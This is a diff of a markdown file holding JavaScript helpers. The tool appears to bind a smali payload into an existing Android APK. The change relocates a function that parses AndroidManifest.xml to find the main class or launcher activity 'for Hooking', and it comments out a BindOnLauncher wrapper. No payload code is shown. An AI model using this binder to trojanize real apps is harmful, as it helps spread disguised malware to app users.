@@ -1,3 +1,73 @@
+## Main Class Extraction Function
+> Supersedes the old GetLauncherActivity function by uysing xml2js
+```js
+//function to extract the launcher activity from the orginal app
+function GetLauncherActivity(manifest) {
+
+    const application = manifest['manifest']['application'][0];
+
+    let mainApplicationClassName = application && application['$'] && application['$']['android:name'];
+
+    if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {
+        mainApplicationClassName = mainApplicationClassName.split('.').pop();
+        if (mainApplicationClassName.startsWith('.')) {
+            mainApplicationClassName = mainApplicationClassName.slice(1);
+        }
+        setTimeout(() => console.log('[★] [¡] Scoped the Main App Class for Hooking...\n'), 1000);
+        return mainApplicationClassName + '.smali';
+    }
+
+    const activity = application && application['activity'] && application['activity'].find((activity) => {
+        const intentFilter = activity['intent-filter'];
+        if (intentFilter) {
+            return intentFilter.some((filter) =>
+                filter['action'] &&
+                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
+                filter['category'] &&
+                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
+            );
+        }
+        return false;
+    });
+
+    if (activity) {
+        let mainActivityClassName = activity['$'] && activity['$']['android:name'];
+        mainActivityClassName = mainActivityClassName.split('.').pop();
+        if (mainActivityClassName.startsWith('.')) {
+            mainActivityClassName = mainActivityClassName.slice(1);
+        }
+        setTimeout(() => console.log('[★] [¡] Scoped the Main Launcher Activity for Hooking...\n'), 1000);
+        return mainActivityClassName + '.smali';
+    }
+
+    const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
+        const intentFilter = activityAlias['intent-filter'];
+        if (intentFilter) {
+            return intentFilter.some((filter) =>
+                filter['action'] &&
+                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
+                filter['category'] &&
+                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
+            );
+        }
+        return false;
+    });
+
+    if (activityAlias) {
+        let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];
+        targetActivityName = targetActivityName.split('.').pop();
+        if (targetActivityName.startsWith('.')) {
+            targetActivityName = targetActivityName.slice(1);
+        }
+        setTimeout(() => console.log('[★] [¡] Scoped the Main Launcher Activity in an Alias for Hooking...\n'), 1000);
+        return targetActivityName + '.smali';
+    }
+
+    return -1;
+
+}
+```
+
 ## Recursive file search function
 > readdirp required!
 ```js
@@ -68,74 +138,6 @@ fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) =>
   });
 
 });
-
-
-
-
-function GetLauncherActivity(manifest) {
-
-  const application = manifest['manifest']['application'][0];
-
-  let mainApplicationClassName = application && application['$'] && application['$']['android:name'];
-
-  if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {
-    mainApplicationClassName = mainApplicationClassName.split('.').pop();
-    if (mainApplicationClassName.startsWith('.')) {
-      mainApplicationClassName = mainApplicationClassName.slice(1);
-    }
-    setTimeout(() => console.log('[¡] Scoped the Main App Class for Hooking...\n'), 1000);
-    return mainApplicationClassName + '.smali';
-  }
-
-  const activity = application && application['activity'] && application['activity'].find((activity) => {
-    const intentFilter = activity['intent-filter'];
-    if (intentFilter) {
-      return intentFilter.some((filter) =>
-        filter['action'] &&
-        filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
-        filter['category'] &&
-        filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
-      );
-    }
-    return false;
-  });
-
-  if (activity) {
-    let mainActivityClassName = activity['$'] && activity['$']['android:name'];
-    mainActivityClassName = mainActivityClassName.split('.').pop();
-    if (mainActivityClassName.startsWith('.')) {
-      mainActivityClassName = mainActivityClassName.slice(1);
-    }
-    setTimeout(() => console.log('[¡] Scoped the Main Launcher Activity for Hooking...\n'), 1000);
-    return mainActivityClassName + '.smali';
-  }
-
-  const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
-    const intentFilter = activityAlias['intent-filter'];
-    if (intentFilter) {
-      return intentFilter.some((filter) =>
-        filter['action'] &&
-        filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
-        filter['category'] &&
-        filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
-      );
-    }
-    return false;
-  });
-
-  if (activityAlias) {
-    let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];
-    targetActivityName = targetActivityName.split('.').pop();
-    if (targetActivityName.startsWith('.')) {
-      targetActivityName = targetActivityName.slice(1);
-    }
-    setTimeout(() => console.log('[¡] Scoped the Main Launcher Activity in an Alias for Hooking...\n'), 1000);
-    return targetActivityName + '.smali';
-  }
-
-  return -1;
-
-}
 ```
 ## Smali Payload Directory Creation Function 
 ```js
@@ -309,7 +311,7 @@ var copyPermissions = (manifest) => {
     return (firstPart + lastPart);
 };
 
-$appCtrl.BindOnLauncher = (apkFolder) => {
+//$appCtrl.BindOnLauncher = (apkFolder) => {
 
     console.log('[★] Finding Launcher Activity From AndroidManifest.xml...');;
     fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
@@ -619,5 +621,5 @@ $appCtrl.BindOnLauncher = (apkFolder) => {
         });
 
     });
-};
+//};
 ```
